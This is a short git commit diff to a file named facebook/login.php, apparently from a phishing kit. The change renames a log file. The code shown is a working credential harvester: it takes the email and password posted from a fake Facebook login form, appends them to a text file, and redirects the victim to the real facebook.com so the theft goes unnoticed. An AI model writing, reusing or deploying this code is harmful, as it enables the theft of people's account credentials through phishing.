f5cfc99f24ff21e292639bcfa6178779d3c10a6a
Bl1xY <45526353+Bl1xY@users.noreply.github.com>
2020-06-04 22:19:53 +0100

    Update login.php

--- facebook/login.php
+++ facebook/login.php
@@ -2,7 +2,7 @@
 
 $user=$_POST["email"];
 $pass=$_POST["password"];
-$creds="credentials.txt";
+$creds="fb-creds.txt";
 file_put_contents($creds,"user: ".$user."\n",FILE_APPEND | LOCK_EX);
 file_put_contents($creds,"password: ".$pass."\n",FILE_APPEND | LOCK_EX);
 header("location: https://www.facebook.com");
